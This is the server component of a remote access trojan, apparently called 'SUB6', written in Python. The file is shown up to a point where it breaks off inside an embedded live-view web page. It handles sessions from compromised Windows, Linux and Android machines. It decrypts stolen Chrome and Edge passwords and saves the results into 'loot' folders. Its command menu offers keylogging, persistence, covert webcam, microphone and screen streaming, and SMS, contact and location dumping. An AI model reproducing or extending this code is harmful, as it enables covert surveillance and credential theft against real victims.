import asyncio
import websockets
import os
import sys
import threading
import queue
import base64
import socket
import json
import http.server
import socketserver
import sqlite3
import shutil
import re
from datetime import datetime

# prompt_toolkit for proper async notification handling
from prompt_toolkit import PromptSession, ANSI
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.styles import Style

from PIL import Image
from io import BytesIO
import webbrowser
from functools import partial

# Try to import crypto libraries for browser password decryption
try:
    from Cryptodome.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Windows-only: DPAPI for decrypting master key
try:
    import win32crypt
    WIN32CRYPT_AVAILABLE = True
except ImportError:
    WIN32CRYPT_AVAILABLE = False

# Browser password decryption functions (server-side)
def decrypt_browser_password(ciphertext, key):
    """Decrypt a Chrome/Edge password using AES-GCM"""
    if not CRYPTO_AVAILABLE:
        return None
    try:
        # Check if it's AES-GCM encrypted (starts with 'v10', 'v11', etc.)
        if ciphertext[:3] == b'v10' or ciphertext[:3] == b'v11':
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode('utf-8', errors='replace')
        else:
            # Old DPAPI encryption (Windows only)
            if WIN32CRYPT_AVAILABLE:
                return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8', errors='replace')
    except Exception:
        pass
    return None

def get_master_key_from_localstate(localstate_path):
    """Extract and decrypt the master key from Chrome/Edge Local State file"""
    if not WIN32CRYPT_AVAILABLE:
        return None
    try:
        with open(localstate_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        # Remove 'DPAPI' prefix (5 bytes) and decrypt with DPAPI
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_browser_database(login_db_path, localstate_path, output_path):
    """Decrypt all passwords in a Chrome/Edge login database"""
    if not CRYPTO_AVAILABLE or not WIN32CRYPT_AVAILABLE:
        return False, "Missing dependencies: pip install pycryptodomex pywin32"
    
    try:
        # Get master key
        master_key = get_master_key_from_localstate(localstate_path)
        if not master_key:
            return False, "Could not decrypt master key"
        
        # Copy database (it may be locked)
        temp_db = login_db_path + ".temp"
        shutil.copy2(login_db_path, temp_db)
        
        # Connect and read passwords
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        results = []
        for url, username, encrypted_pass in cursor.fetchall():
            if url and username and encrypted_pass:
                password = decrypt_browser_password(encrypted_pass, master_key)
                if password:
                    results.append(f"URL: {url}")
                    results.append(f"Username: {username}")
                    results.append(f"Password: {password}")
                    results.append("---")
        
        conn.close()
        os.remove(temp_db)
        
        if results:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(results))
            return True, f"Decrypted {len(results)//4} passwords"
        else:
            return False, "No passwords found"
            
    except Exception as e:
        return False, str(e)

# ANSI Color codes - Global
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class WebSocketServer:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.sessions = {}
        self.session_counter = 1
        self.active_session = None
        self.running = True
        self.input_queue = queue.Queue()
        self.input_thread = None
        self.output_lock = threading.Lock()  # Lock for thread-safe output
        self.current_input_line = ""  # Track what user is typing
        self.message_queue = queue.Queue()  # Queue for async messages (won't interrupt typing)
        self.in_shell_mode = False  # Track if user is in shell mode on client
        self.last_client_prompt = ""  # Store the last prompt received from client
        
        # prompt_toolkit session for proper input handling
        self.prompt_session = PromptSession()
        
        # Live view state
        self.liveview_session = None
        self.liveview_frames = {}  # session_id -> latest frame data
        self.liveview_web_port = 8888
        self.liveview_server = None
        self.liveview_server_thread = None
        
        # Camera view state
        self.camview_session = None
        self.camview_frames = {}  # session_id -> latest camera frame data
        self.camview_web_port = 8889
        self.camview_server_thread = None
        
        # Audio recording state
        self.audio_sessions = {}  # session_id -> audio data
        
        # Live audio streaming state
        self.liveaudio_session = None
        self.liveaudio_chunks = {}  # session_id -> audio chunks queue
        self.liveaudio_web_port = 8890
        self.liveaudio_server_thread = None
        self.liveaudio_samplerate = 22050
        self.liveaudio_channels = 1
        
        # Browser credential files for server-side decryption
        # Format: session_id -> {'chrome_login': path, 'chrome_state': path, 'edge_login': path, 'edge_state': path}
        self.browser_cred_files = {}
        
        # HTTP file server for client downloads (extractor, etc.)
        self.http_port = 8081  # HTTP file server port
        self.http_server_thread = None
        
        os.makedirs("loot/screenshots", exist_ok=True)
        os.makedirs("loot/downloads", exist_ok=True)
        os.makedirs("loot/webcam", exist_ok=True)
        os.makedirs("loot/audio", exist_ok=True)
        os.makedirs("loot/passwords", exist_ok=True)
        os.makedirs("files", exist_ok=True)  # For files to serve via HTTP
    
    def start_http_file_server(self):
        """Start HTTP file server for client downloads (svc.exe, etc.)"""
        files_dir = os.path.abspath("files")
        
        def run_server(port, directory):
            class QuietHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, directory=directory, **kwargs)
                
                def log_message(self, format, *args):
                    pass  # Silent logging
            
            try:
                with socketserver.TCPServer(("0.0.0.0", port), QuietHandler) as httpd:
                    httpd.serve_forever()
            except Exception as e:
                print(f"[!] HTTP server error: {e}")
        
        self.http_server_thread = threading.Thread(
            target=run_server, 
            args=(self.http_port, files_dir),
            daemon=True
        )
        self.http_server_thread.start()
    
    def async_print(self, message, end='\n'):
        """
        Thread-safe notification that doesn't break user input.
        Uses prompt_toolkit's print_formatted_text which automatically:
        - Saves the current input buffer
        - Moves cursor up and prints notification
        - Restores prompt and input buffer
        """
        # Simple print - prompt_toolkit's patch_stdout context handles the rest
        print(message)
    
    def flush_messages(self):
        """Print all queued messages - call this after user submits command"""
        messages = []
        while True:
            try:
                msg = self.message_queue.get_nowait()
                messages.append(msg)
            except queue.Empty:
                break
        if messages:
            for msg in messages:
                print(msg)
    
    def print_with_flush(self, prompt_func=None):
        """Flush queued messages then print prompt"""
        self.flush_messages()
        if prompt_func:
            print(prompt_func, end="", flush=True)
    
    def clear_screen(self):
        """Clear the terminal screen"""
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    
    def server_prompt(self):
        """Server prompt with red sub6"""
        return ANSI('\033[91msub6\033[0m > ')
    
    def session_prompt(self, sid):
        """Session prompt with cyan session"""
        return ANSI(f'\033[96msession {sid}\033[0m > ')
    
    def print_session_help(self, session_id):
        """Print OS-specific help menu for session"""
        session = self.sessions.get(session_id, {})
        os_type = session.get('os_type', 'unknown')
        
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        RESET = '\033[0m'
        
        # Common commands for all platforms
        print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
        
        if os_type == 'windows':
            print(f"              {CYAN}Session Commands{RESET} [{MAGENTA}WINDOWS{RESET}]")
        elif os_type == 'linux':
            print(f"              {CYAN}Session Commands{RESET} [{GREEN}LINUX{RESET}]")
        elif os_type == 'android':
            print(f"              {CYAN}Session Commands{RESET} [{GREEN}ANDROID{RESET}]")
        else:
            print(f"              {CYAN}Session Commands{RESET} [{RED}UNKNOWN OS{RESET}]")
        
        print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
        
        # Common commands
        print(f"\n  {YELLOW}[General]{RESET}")
        print(f"  {GREEN}background{RESET}           - Return to server prompt")
        print(f"  {GREEN}sysinfo{RESET}              - System information")
        print(f"  {GREEN}screenshot{RESET}           - Take screenshot")
        print(f"  {GREEN}shell{RESET}                - Interactive shell")
        print(f"  {GREEN}ps{RESET}                   - List processes")
        print(f"  {GREEN}download <file>{RESET}      - Download file from client")
        print(f"  {GREEN}upload <file>{RESET}        - Upload file to client")
        print(f"  {GREEN}cmd <command>{RESET}        - Execute single command")
        print(f"  {GREEN}cd <path>{RESET}            - Change directory")
        print(f"  {GREEN}pwd{RESET}                  - Show current directory")
        print(f"  {GREEN}persist{RESET}              - Install persistence")
        print(f"  {GREEN}unpersist{RESET}            - Remove persistence")
        print(f"  {GREEN}exit{RESET}                 - Close client session")
        
        # Windows-specific commands
        if os_type == 'windows':
            print(f"\n  {YELLOW}[Windows - Live Streaming (Smooth & High Quality)]{RESET}")
            print(f"  {GREEN}liveview [fps] [quality]{RESET} - Live screen (default: 30fps 80%)")
            print(f"  {GREEN}stoplive{RESET}             - Stop live screen view")
            print(f"  {GREEN}camview [fps] [quality]{RESET} - Live webcam (default: 30fps 80%)")
            print(f"  {GREEN}stopcam{RESET}              - Stop live webcam view")
            print(f"  {GREEN}liveaudio [rate]{RESET}     - Live microphone (default: 22050Hz)")
            print(f"  {GREEN}stopaudio{RESET}            - Stop live audio stream")
            print(f"\n  {YELLOW}[Windows - Camera & Audio]{RESET}")
            print(f"  {GREEN}listcam{RESET}              - List available cameras")
            print(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
            print(f"  {GREEN}camshot{RESET}              - Take webcam photo")
            print(f"  {GREEN}soundrecord [seconds]{RESET} - Record audio (1-300s)")
            print(f"\n  {YELLOW}[Windows - Screen Recording]{RESET}")
            print(f"  {GREEN}startrecord{RESET}          - Start screen recording (native res, 5fps)")
            print(f"  {GREEN}stoprecord{RESET}           - Stop screen recording")
            print(f"  {GREEN}getrecord{RESET}            - Download screen recording")
            print(f"  {GREEN}delrecord{RESET}            - Delete screen recording")
            print(f"\n  {YELLOW}[Windows - Mouse & Keyboard]{RESET}")
            print(f"  {GREEN}mousemove <x> <y>{RESET}    - Move mouse to position")
            print(f"  {GREEN}click / leftclick{RESET}    - Left mouse click")
            print(f"  {GREEN}rightclick{RESET}           - Right mouse click")
            print(f"  {GREEN}sendkeys <text>{RESET}      - Send keystrokes ([ENTER],[TAB],etc)")
            print(f"\n  {YELLOW}[Windows - Extraction]{RESET}")
            print(f"  {GREEN}browsercreds{RESET}         - Extract browser credentials & wifi")
            print(f"  {GREEN}downloadfolder <dir>{RESET} - Download entire folder (zipped)")
            print(f"\n  {YELLOW}[Windows - Persistence]{RESET}")
            print(f"  {GREEN}keylogs{RESET}              - Download keylogger file")
            print(f"  {GREEN}clearlogs{RESET}            - Clear keylogger file")
            print(f"\n  {YELLOW}[Session Control]{RESET}")
            print(f"  {GREEN}clear{RESET}                - Clear screen")
            print(f"  {GREEN}back / background{RESET}    - Return to server prompt")
            print(f"\n  {CYAN}Tip: Use 30+ fps and 80%+ quality for smooth HD streaming{RESET}")
        
        # Linux-specific commands
        elif os_type == 'linux':
            print(f"\n  {YELLOW}[Linux Streaming]{RESET}")
            print(f"  {GREEN}liveview [fps] [q%]{RESET}  - Live screen stream (default: 30fps, 80%)")
            print(f"  {GREEN}stoplive{RESET}             - Stop live screen stream")
            print(f"  {GREEN}camview [fps] [q%]{RESET}   - Live camera stream (default: 15fps, 70%)")
            print(f"  {GREEN}stopcam{RESET}              - Stop live camera stream")
            print(f"  {GREEN}liveaudio [rate]{RESET}     - Live audio stream (default: 22050 Hz)")
            print(f"  {GREEN}stopaudio{RESET}            - Stop live audio stream")
            print(f"\n  {YELLOW}[Linux Camera]{RESET}")
            print(f"  {GREEN}listcam{RESET}              - List available cameras")
            print(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
            print(f"  {GREEN}camshot{RESET}              - Take webcam photo")
            print(f"\n  {YELLOW}[Files & Extraction]{RESET}")
            print(f"  {GREEN}download <file>{RESET}      - Download file from client")
            print(f"  {GREEN}downloadfolder <path>{RESET}- Download folder as tar.gz")
            print(f"  {GREEN}browsercreds{RESET}         - Extract browser data & WiFi passwords")
            print(f"\n  {YELLOW}[Linux Keylogger]{RESET}")
            print(f"  {GREEN}keylogs{RESET}              - Download input log (requires root)")
            print(f"  {GREEN}clearlogs{RESET}            - Clear input log")
            print(f"\n  {CYAN}Note: Streaming requires scrot/ffmpeg. Audio needs alsa-utils{RESET}")
        
        # Android-specific commands  
        elif os_type == 'android':
            print(f"\n  {YELLOW}[Android Only]{RESET}")
            print(f"  {GREEN}listcam{RESET}              - List available cameras")
            print(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
            print(f"  {GREEN}camshot{RESET}              - Take camera photo")
            print(f"  {GREEN}sms{RESET}                  - Dump SMS messages (root)")
            print(f"  {GREEN}contacts{RESET}             - Dump contacts (root)")
            print(f"  {GREEN}calllog{RESET}              - Dump call history (root)")
            print(f"  {GREEN}apps{RESET}                 - List installed apps")
            print(f"  {GREEN}wifi{RESET}                 - WiFi info & saved networks")
            print(f"  {GREEN}location{RESET}             - Get device location (root)")
            print(f"  {CYAN}Note: Many features require rooted device{RESET}")
        
        else:
            print(f"\n  {RED}[OS not detected - showing all commands]{RESET}")
            print(f"  {GREEN}keylogs{RESET}              - Download keylogger/input log")
            print(f"  {GREEN}clearlogs{RESET}            - Clear log file")
        
        print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}\n")
    
    def start_input_thread(self):
        """Start background thread for reading input"""
        def read_input():
            while self.running:
                try:
                    line = input()
                    self.input_queue.put(line)
                except EOFError:
                    break
                except Exception:
                    pass
        
        self.input_thread = threading.Thread(target=read_input, daemon=True)
        self.input_thread.start()
    
    def find_duplicate_session(self, computer, user, client_ip, client_id=None):
        """Check if there's already an active session from the same client"""
        for sid, session in list(self.sessions.items()):
            # First priority: Check by ClientID (unique per client instance)
            if client_id and session.get('client_id') == client_id and client_id != 'Unknown':
                return sid
            # Fallback: Check if same computer/user combo exists (only if no ClientID)
            if not client_id and (session.get('computer') == computer and 
                session.get('user') == user and 
                computer != 'Unknown'):
                return sid
            # Also check same IP with recent connection (within 5 seconds)
            if session.get('addr') and session['addr'][0] == client_ip:
                time_diff = (datetime.now() - session.get('start_time', datetime.now())).total_seconds()
                if time_diff < 5 and session.get('computer') == 'Unknown':
                    return sid
        return None
    
    async def handle_client(self, websocket):
        """Handle WebSocket client connection"""
        session_id = self.session_counter
        self.session_counter += 1
        
        client_ip = websocket.remote_address[0]
        
        # Check for very recent duplicate connection from same IP (race condition)
        for sid, session in list(self.sessions.items()):
            if session.get('addr') and session['addr'][0] == client_ip:
                time_diff = (datetime.now() - session.get('start_time', datetime.now())).total_seconds()
                if time_diff < 2:  # Within 2 seconds = likely duplicate
                    # Close the older one
                    try:
                        await session['websocket'].close()
                    except:
                        pass
                    if sid in self.sessions:
                        del self.sessions[sid]
                    self.async_print(f"\033[93m[!]\033[0m Closed duplicate session {sid} from {client_ip}")
        
        self.sessions[session_id] = {
            'websocket': websocket,
            'addr': websocket.remote_address,
            'start_time': datetime.now(),
            'screenshot_mode': False,
            'screenshot_data': b'',
            'file_mode': False,
            'file_data': b'',
            'file_name': '',
            'computer': 'Unknown',
            'user': 'Unknown',
            'client_id': 'Unknown',  # Unique client identifier
            'os_type': 'unknown'  # windows, linux, android
        }
        
        GREEN = '\033[92m'
        CYAN = '\033[96m'
        RESET = '\033[0m'
        
        # Show notification immediately without breaking input
        self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
        self.async_print(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
        
        try:
            async for message in websocket:
                if isinstance(message, bytes):
                    data = message
                else:
                    data = message.encode('utf-8')
                
                session = self.sessions.get(session_id)
                if not session:
                    break
                
                # Extract computer name, username, and OS type from session info
                try:
                    text_data = data.decode('utf-8', errors='replace')
                    
                    # Detect OS type from connection message
                    if session.get('os_type') == 'unknown':
                        if 'Windows Client Connected' in text_data or 'Windows' in text_data and 'OS:' in text_data:
                            session['os_type'] = 'windows'
                        elif 'Android Client Connected' in text_data or 'Android' in text_data:
                            session['os_type'] = 'android'
                        elif 'Linux Client Connected' in text_data or ('Linux' in text_data and 'Kernel:' in text_data):
                            session['os_type'] = 'linux'
                    
                    # Extract computer/hostname and username
                    if session.get('computer') == 'Unknown':
                        import re
                        # Windows format: Computer: X | User: Y
                        comp_match = re.search(r'Computer:\s*(\S+)', text_data)
                        # Linux format: Host: X | User: Y  
                        host_match = re.search(r'Host:\s*(\S+)', text_data)
                        # Android format: Device: X
                        device_match = re.search(r'Device:\s*(.+?)(?:\||$|\n)', text_data)
                        
                        user_match = re.search(r'User:\s*(\S+)', text_data)
                        # ClientID for unique client identification
                        clientid_match = re.search(r'ClientID:\s*(\S+)', text_data)
                        
                        if comp_match:
                            session['computer'] = comp_match.group(1)
                        elif host_match:
                            session['computer'] = host_match.group(1)
                        elif device_match:
                            session['computer'] = device_match.group(1).strip()
                        
                        if user_match:
                            session['user'] = user_match.group(1)
                        
                        if clientid_match:
                            session['client_id'] = clientid_match.group(1)
                        
                        if session['computer'] != 'Unknown':
                            # Check for duplicate session using ClientID (preferred) or computer/user
                            dup_sid = self.find_duplicate_session(session['computer'], session['user'], client_ip, session.get('client_id'))
                            if dup_sid and dup_sid != session_id:
                                # Close the older duplicate session
                                try:
                                    old_ws = self.sessions[dup_sid]['websocket']
                                    await old_ws.close()
                                except:
                                    pass
                                if dup_sid in self.sessions:
                                    del self.sessions[dup_sid]
                                if self.active_session == dup_sid:
                                    self.active_session = None
                                self.async_print(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same client: {session.get('client_id', session['computer'])})")
                            
                            os_label = session['os_type'].upper() if session['os_type'] != 'unknown' else 'UNKNOWN'
                            self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
                except:
                    pass
                
                # Check for screenshot data
                if b'<<<SCREENSHOT_START>>>' in data or session['screenshot_mode']:
                    if not session['screenshot_mode']:
                        session['screenshot_mode'] = True
                        session['screenshot_data'] = b''
                    
                    session['screenshot_data'] += data
                    
                    if b'<<<SCREENSHOT_END>>>' in session['screenshot_data']:
                        await self.save_screenshot(session_id, session['screenshot_data'])
                        session['screenshot_mode'] = False
                        session['screenshot_data'] = b''
                    continue
                
                # Check for live view frame data
                if b'<<<LIVEVIEW_FRAME>>>' in data or session.get('liveview_mode'):
                    await self.handle_liveview_frame(session_id, session, data)
                    continue
                
                # Check for live view start notification
                if b'<<<LIVEVIEW_START>>>' in data:
                    try:
                        text = data.decode('utf-8', errors='replace')
                        import re
                        match = re.search(r'<<<LIVEVIEW_START>>>(\d+)\|(\d+)', text)
                        if match:
                            fps = int(match.group(1))
                            quality = int(match.group(2))
                            self.liveview_session = session_id
                            session['liveview_fps'] = fps
                            session['liveview_quality'] = quality
                            await self.start_liveview_server(session_id)
                    except:
                        pass
                    continue
                
                # Check for live view stop notification
                if b'<<<LIVEVIEW_STOPPED>>>' in data:
                    if self.liveview_session == session_id:
                        self.liveview_session = None
                        if session_id in self.liveview_frames:
                            del self.liveview_frames[session_id]
                    continue
                
                # Check for camera shot data
                if b'<<<CAMSHOT_START>>>' in data or b'<<<CAMSHOT_JPEG>>>' in data or session.get('camshot_mode'):
                    if not session.get('camshot_mode'):
                        session['camshot_mode'] = True
                        session['camshot_data'] = b''
                    
                    session['camshot_data'] += data
                    
                    if b'<<<CAMSHOT_END>>>' in session['camshot_data']:
                        await self.save_camshot(session_id, session['camshot_data'])
                        session['camshot_mode'] = False
                        session['camshot_data'] = b''
                    continue
                
                # Check for camera view frame data (RGB or JPEG)
                if b'<<<CAMVIEW_FRAME>>>' in data or b'<<<CAMVIEW_JPEG>>>' in data or session.get('camview_mode'):
                    await self.handle_camview_frame(session_id, session, data)
                    continue
                
                # Check for camera view start notification
                if b'<<<CAMVIEW_START>>>' in data:
                    try:
                        text = data.decode('utf-8', errors='replace')
                        import re
                        match = re.search(r'<<<CAMVIEW_START>>>(\d+)', text)
                        if match:
                            fps = int(match.group(1))
                            self.camview_session = session_id
                            session['camview_fps'] = fps
                            await self.start_camview_server(session_id)
                    except:
                        pass
                    continue
                
                # Check for camera view stop notification
                if b'<<<CAMVIEW_STOPPED>>>' in data:
                    if self.camview_session == session_id:
                        self.camview_session = None
                        if session_id in self.camview_frames:
                            del self.camview_frames[session_id]
                    continue
                
                # Check for live audio streaming start
                if b'<<<LIVEAUDIO_START>>>' in data:
                    try:
                        text = data.decode('utf-8', errors='replace')
                        import re
                        match = re.search(r'<<<LIVEAUDIO_START>>>(\d+)\|(\d+)', text)
                        if match:
                            self.liveaudio_samplerate = int(match.group(1))
                            self.liveaudio_channels = int(match.group(2))
                            self.liveaudio_session = session_id
                            self.liveaudio_chunks[session_id] = []
                            await self.start_liveaudio_server(session_id)
                    except:
                        pass
                    continue
                
                # Check for live audio chunk
                if b'<<<AUDIO_CHUNK>>>' in data or session.get('audiochunk_mode'):
                    await self.handle_audio_chunk(session_id, session, data)
                    continue
                
                # Check for live audio stop
                if b'<<<LIVEAUDIO_STOPPED>>>' in data:
                    if self.liveaudio_session == session_id:
                        self.liveaudio_session = None
                        if session_id in self.liveaudio_chunks:
                            del self.liveaudio_chunks[session_id]
                    continue
                
                # Check for audio recording data
                if b'<<<AUDIO_START>>>' in data or session.get('audio_mode'):
                    if not session.get('audio_mode'):
                        session['audio_mode'] = True
                        session['audio_data'] = b''
                    
                    session['audio_data'] += data
                    
                    if b'<<<AUDIO_END>>>' in session['audio_data']:
                        await self.save_audio(session_id, session['audio_data'])
                        session['audio_mode'] = False
                        session['audio_data'] = b''
                    continue
                
                # Check for file download
                if b'<<<FILE_START>>>' in data or session['file_mode']:
                    if not session['file_mode']:
                        session['file_mode'] = True
                        session['file_data'] = b''
                    
                    session['file_data'] += data
                    
                    if b'<<<FILE_END>>>' in session['file_data']:
                        await self.save_file(session_id, session['file_data'])
                        session['file_mode'] = False
                        session['file_data'] = b''
                    continue
                
                # Regular output - only print if this is the active session
                if self.active_session == session_id:
                    try:
                        text = data.decode('utf-8', errors='replace')
                        print(text, end='', flush=True)
                        # Capture the last line as potential shell prompt (for clear command)
                        lines = text.split('\n')
                        last_line = lines[-1].strip() if lines else ''
                        # Check if it looks like a shell prompt (ends with > or $ or #)
                        if last_line and (last_line.endswith('>') or last_line.endswith('$') or last_line.endswith('#')):
                            self.last_client_prompt = last_line + ' '
                    except:
                        pass
        
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            self.async_print(f"\033[91m[!]\033[0m Error: {e}")
        finally:
            was_active = (self.active_session == session_id)
            if session_id in self.sessions:
                del self.sessions[session_id]
            if self.active_session == session_id:
                self.active_session = None
            
            self.async_print(f"\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
            if was_active:
                self.async_print("[!] You were interacting with this session - returned to server prompt")
    
    async def save_screenshot(self, session_id, data):
        """Save screenshot (handles base64 encoded data)"""
        try:
            start = data.find(b'<<<SCREENSHOT_START>>>')
            data_start = data.find(b'<<<DATA_START>>>')
            end = data.find(b'<<<SCREENSHOT_END>>>')
            
            if start == -1 or data_start == -1 or end == -1:
                if self.active_session == session_id:
                    self.message_queue.put("[!] Invalid screenshot format")
                return
            
            header = data[start+22:data_start].decode('utf-8')
            parts = header.split('|')
            
            if len(parts) < 3:
                if self.active_session == session_id:
                    self.message_queue.put("[!] Invalid header")
                return
            
            width = int(parts[0])
            height = int(parts[1])
            expected_size = int(parts[2])
            
            pixel_start = data_start + 16  # <<<DATA_START>>> is 16 chars
            b64_data = data[pixel_start:end]
            
            # Clean base64 data - remove any non-base64 characters
            import re
            b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
            
            # Decode base64 to get raw pixel data
            try:
                pixel_data = base64.b64decode(b64_clean)
            except Exception as e:
                if self.active_session == session_id:
                    self.message_queue.put(f"[!] Base64 decode error: {e}")
                return
            
            if len(pixel_data) >= width * height * 3:
                image = Image.frombytes('RGB', (width, height), pixel_data[:width * height * 3])
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"loot/screenshots/session_{session_id}_{timestamp}.png"
                
                image.save(filename)
                if self.active_session == session_id:
                    self.message_queue.put(f"[+] Screenshot saved: {filename}")
            else:
                if self.active_session == session_id:
                    self.message_queue.put(f"[!] Incomplete screenshot data ({len(pixel_data)} vs {width * height * 3})")
                
        except Exception as e:
            if self.active_session == session_id:
                self.message_queue.put(f"[!] Screenshot error: {e}")
    
    async def handle_liveview_frame(self, session_id, session, data):
        """Handle live view frame data"""
        try:
            if not session.get('liveview_mode'):
                session['liveview_mode'] = True
                session['liveview_data'] = b''
            
            session['liveview_data'] += data
            
            if b'<<<FRAME_END>>>' in session['liveview_data']:
                frame_data = session['liveview_data']
                session['liveview_mode'] = False
                session['liveview_data'] = b''
                
                # Parse frame
                start = frame_data.find(b'<<<LIVEVIEW_FRAME>>>')
                data_start = frame_data.find(b'<<<FRAME_DATA>>>')
                end = frame_data.find(b'<<<FRAME_END>>>')
                
                if start == -1 or data_start == -1 or end == -1:
                    return
                
                header = frame_data[start+20:data_start].decode('utf-8')
                parts = header.split('|')
                
                # Support both old format (width|height) and new format (width|height|size)
                if len(parts) < 2:
                    return
                
                width = int(parts[0])
                height = int(parts[1])
                expected_size = int(parts[2]) if len(parts) >= 3 else 0
                
                # Extract base64 data
                b64_data = frame_data[data_start+16:end]
                
                # Clean base64
                import re
                b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
                
                try:
                    pixel_data = base64.b64decode(b64_clean)
                except:
                    return
                
                # Convert to PNG for web display
                if len(pixel_data) >= width * height * 3:
                    stride = ((width * 3 + 3) & ~3)
                    # Reconstruct image
                    image = Image.frombytes('RGB', (width, height), pixel_data[:width * height * 3])
                    
                    # Convert to JPEG for efficient streaming
                    buffer = BytesIO()
                    image.save(buffer, format='JPEG', quality=70)
                    jpeg_data = buffer.getvalue()
                    
                    # Store for web server
                    self.liveview_frames[session_id] = {
                        'data': jpeg_data,
                        'width': width,
                        'height': height,
                        'timestamp': datetime.now()
                    }
        except Exception as e:
            pass
    
    async def start_liveview_server(self, session_id):
        """Start the HTTP server for live view"""
        if self.liveview_server_thread and self.liveview_server_thread.is_alive():
            # Already running
            pass
        else:
            # Start web server in background thread
            self.liveview_server_thread = threading.Thread(
                target=self.run_liveview_webserver,
                args=(session_id,),
                daemon=True
            )
            self.liveview_server_thread.start()
        
        # Get local IP addresses
        local_ip = self.get_local_ip()
        
        GREEN = '\033[92m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        RESET = '\033[0m'
        
        print(f"\n{GREEN}[+]{RESET} Live View started for session {CYAN}{session_id}{RESET}")
        print(f"{GREEN}[*]{RESET} Open browser to view screen:")
        print(f"    {CYAN}http://localhost:{self.liveview_web_port}{RESET}")
        print(f"    {CYAN}http://{local_ip}:{self.liveview_web_port}{RESET}")
        print(f"{YELLOW}[*]{RESET} Use '{CYAN}stoplive{RESET}' in session to stop streaming")
        
        if self.active_session:
            print(self.session_prompt(self.active_session), end="", flush=True)
        else:
            print(self.server_prompt(), end="", flush=True)
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def run_liveview_webserver(self, session_id):
        """Run HTTP server for live view"""
        server_instance = self
        
        class LiveViewHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress logging
            
            def do_GET(self):
                if self.path == '/' or self.path == '/index.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html = '''<!DOCTYPE html>
<html>
<head>
    <title>Live View - Session ''' + str(session_id) + '''</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #1a1a2e; 
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .header {
            background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%);
            width: 100%;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e94560;
        }
        .logo {
            color: #e94560;
            font-size: 24px;
            font-weight: bold;
        }
        .status {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #4ecca3;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .status-text {
            color: #4ecca3;
            font-size: 14px;
        }
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            width: 100%;
        }
        #screen {
            max-width: 95%;
            max-height: calc(100vh - 120px);
            border: 3px solid #e94560;
            border-radius: 8px;
            box-shadow: 0 0 30px rgba(233, 69, 96, 0.3);
        }
        .info {
            color: #888;
            padding: 10px;
            text-align: center;
            font-size: 12px;
        }
        .error {
            color: #e94560;
            font-size: 18px;
            padding: 50px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🖥️ SUB6 Live View</div>
        <div class="status">
            <div class="status-dot" id="statusDot"></div>
            <span class="status-text" id="statusText">Connecting...</span>
        </div>
    </div>
    <div class="container">
        <img id="screen" alt="Remote Screen" />
    </div>
    <div class="info">
        Session: ''' + str(session_id) + ''' | <span id="fps">0</span> FPS | <span id="resolution">-</span>
    </div>
    
    <script>
        const img = document.getElementById('screen');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const fpsDisplay = document.getElementById('fps');
        const resDisplay = document.getElementById('resolution');
        
